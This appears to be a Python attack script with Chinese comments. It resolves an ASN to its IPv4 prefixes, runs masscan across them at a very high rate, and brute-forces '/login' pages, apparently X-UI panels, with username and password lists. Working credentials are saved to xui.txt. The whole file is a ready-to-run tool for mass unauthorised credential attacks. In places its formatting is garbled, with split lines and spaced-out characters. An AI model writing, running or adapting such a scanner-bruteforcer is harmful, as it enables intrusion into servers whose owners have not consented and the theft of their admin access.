import requests
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import subprocess
import time
from tqdm import tqdm
from multiprocessing import cpu_count
import itertools
# 检 查 并 安 装 Masscan和 Libpcap函 数
def install_masscan():
    print("开 始 执 行  install_masscan()， 检 查 并 安 装  Masscan 和  libpcap-dev")
    def is_installed(package_name):
        try:
            subprocess.run(['dpkg', '-s', package_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except subprocess.CalledProcessError:
            return False
    if not is_installed('masscan'):
        print("Masscan 未 安 装 。 正 在 安 装  Masscan...")        os.system('apt update && apt install -y masscan')
    else:
        print("Masscan 已 经 安 装 。 ")
    if not is_installed('libpcap-dev'):
        print("libpcap-dev 未 安 装 。 正 在 安 装  libpcap-dev...")
        os.system('apt update && apt install -y libpcap-dev')
    else:
        print("libpcap-dev 已 经 安 装 。 ")
# 检 查 所 需 文 件 是 否 存 在 函 数
def check_required_files():
    print("开 始 执 行  check_required_files()， 检 查 所 需文 件 是 否 存 在 ")
    required_files = ['user.txt', 'pass.txt', 'ports.txt']
    for file in required_files:
        if not os.path.exists(file):
            print(f"错 误 : 未 找 到  {file} 文 件 。 ")
            return False
    return True
# 获 取 指 定 ASN的 掩 码 函 数
def get_prefixes(asn):
    print(f"开 始 执 行  get_prefixes()， 获 取 ASN {asn} 的掩 码 ")
    url = f'https://bgp.he.net/super-lg/report/api/v1/prefixes/originated/{asn}'
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        # 过 滤 掉 IPv6的 前 缀 ， 只 保 留 IPv4的 前 缀
        ipv4_prefixes = [item['Prefix'] for item in
data['prefixes'] if ':' not in item['Prefix']]
        return ipv4_prefixes
    else:
        print(f"获 取 ASN {asn} 的 数 据 失 败 ")
        return []
# 保 存 前 缀 到 文 件 函 数
def save_prefixes_to_file(prefixes, filename):
    print(f"开 始 执 行  save_prefixes_to_file()， 保 存 前
缀 到  {filename}")
    try:
        with open(filename, 'w') as file:  # 使 用 'w'模 式 以 清 空 并 重 新 写 入 文 件
            for prefix in prefixes:
                file.write(prefix + '\n')
    except IOError as e:
        print(f"写 入  {filename} 时 出 错 : {e}")
        exit(1)
# 运 行 Masscan函 数
def run_masscan():
    print("开 始 执 行  run_masscan()， 运 行 端 口 扫 描 ")
    try:
        with open("ports.txt", "r") as file:
            ports = ','.join([line.strip() for line
in file])
        os.system(f'masscan --exclude 255.255.255.255 -p{ports} --max-rate 102400000 -oG results.txt -iL prefixes.txt')
    except Exception as e:
        print(f"运 行  masscan 时 出 错 : {e}")
        exit(1)
# 检 查 URL是 否 可 访 问 函 数
def check_url(session, url):
    try:
        response = session.get(url, timeout=3)
        return response.status_code == 200
    except requests.RequestException:
        return False
# 尝 试 登 录 函 数
def try_login(session, ip, port, users, passwords):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/58.0.3029.110 Safari/537.3'
    }
    url_base = f"http://{ip}:{port}/login"
    for username, password in itertools.product(users, passwords):
        data = {
            'username': username.strip(),
            'password': password.strip()
        }
        try:
            r = session.post(url_base, data=data, headers=headers, timeout=3)
            if r.status_code == 200:
                try:
                    response_data = r.json()
                    if response_data.get("success"):                        save_successful_ip(ip, port, username, password)
                        print(f"登 录 成 功 : http://{ip}:{port} 用 户 名 : {username} 密 码 : {password}")
                        return True
                except ValueError:
                    pass
        except requests.RequestException:
            pass
    return False
def process_ip(ip, ports, users, passwords, progress_bar):
    with requests.Session() as session:
        try:
            for port in ports:
                url_http = f"http://{ip}:{port}"
                if check_url(session, url_http):
                    if try_login(session, ip, port,
users, passwords):
                        break
        except Exception as e:
            print(f"处 理 IP {ip} 时 出 错 : {e}")
        progress_bar.update(1)  # 更 新 进 度 条
# 保 存 成 功 登 录 地 址 和 凭 证 到 文 件 函 数
def save_successful_ip(ip, port, username, password):
    try:
        with open("xui.txt", "a") as result:
            result.write(f"http://{ip}:{port} ,{username},{password}\n")
    except IOError as e:
        print(f"写 入  xui.txt 时 出 错 : {e}")
# 主 函 数
def main():
    start_time = time.time()
    print("开 始 执 行  main()， 启 动 整 个 流 程 ")
    install_masscan()  # 先 安 装 必 要 的 工 具
    if not check_required_files():  # 检 查 所 需 文 件
        return
    print("请 选 择 操 作 ： ")
    print("1. 输 入 ASN或 IP前 缀 并 开 始 全 流 程 ")
    print("2. 使 用 现 有 的 prefixes.txt文 件 并 开 始 扫 描 ")    print("3. 使 用 现 有 的 results.txt文 件 并 尝 试 登 录 ")
    choice = input("请 输 入 选 择 （ 1/2/3， 默 认 为 1） ： ") or '1'
    if choice == '1':
        user_input = input("请 输 入 ASN（ 例 如 12345） 或IP前 缀 （ 用 逗 号 分 隔 ， 例 如 192.168.1.0/24） ： ")
        if user_input.strip():
            open('prefixes.txt', 'w').close()
            if user_input.isdigit():
                asn = user_input
                prefixes = get_prefixes(asn)
                if not prefixes:
                    print(f"未 找 到 ASN {asn} 的 前 缀 。
")
                    return
                save_prefixes_to_file(prefixes, 'prefixes.txt')
            else:
                prefixes = user_input.split(',')
                save_prefixes_to_file(prefixes, 'prefixes.txt')
        else:
            print("错 误 : 未 输 入 有 效 的 ASN或 IP前 缀 。 ")            return
        run_masscan()
    elif choice == '2':
        if os.path.exists('prefixes.txt') and os.path.getsize('prefixes.txt') > 0:
            run_masscan()
        else:
            print("错 误 : prefixes.txt 文 件 为 空 或 不 存在 。 ")
            return
    elif choice == '3':
        if not os.path.exists('results.txt') or os.path.getsize('results.txt') == 0:
            print("错 误 : results.txt 文 件 为 空 或 不 存 在。 ")
            return
    else:
        print("无 效 选 择 。 ")
        return
    try:
        with open("results.txt", "r") as file:
            ips = [line.split("Host: ")[1].split(" ")[0] for line in file if "Host: " in line]
    except IOError as e:
        print(f"读 取  results.txt 时 出 错 : {e}")
        return
    with open("ports.txt", "r") as file:
        ports = [line.strip() for line in file]
    with open('user.txt', 'r') as user_file, open('pass.txt', 'r') as pass_file:
        users = user_file.readlines()
        passwords = pass_file.readlines()
    print("开 始 尝 试 登 录 扫 描 到 的 IP")
    core_multiplier = 1
    max_threads = cpu_count() * int(core_multiplier)  # 使 用 CPU核 心 数 的 倍 数 作 为 最 大 线 程 数
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        with tqdm(total=len(ips)) as progress_bar:
# 初 始 化 进 度 条
            futures = {executor.submit(process_ip, ip, ports, users, passwords, progress_bar): ip for ip in ips}
            for future in as_completed(futures):
                future.result()  # 确 保 所 有 任 务 完 成
    if os.path.exists("xui.txt") and os.path.getsize("xui.txt") > 0:
        print("流 程 完 成 ， 已 找 到 成 功 登 录 的 IP， 详 情 如 下： ")
        with open("xui.txt", "r") as file:
            for line in file:
                print(line.strip())
        print("您 可 以 查 看  xui.txt 文 件 以 获 取 更 多 详 细信 息 。 ")
    else:
        print("xui.txt 中 未 找 到 成 功 登 录 的 记 录 。 ")
    end_time = time.time()
    print(f"总 执 行 时 间 : {end_time - start_time:.2f}秒")
if __name__ == "__main__":
    main()
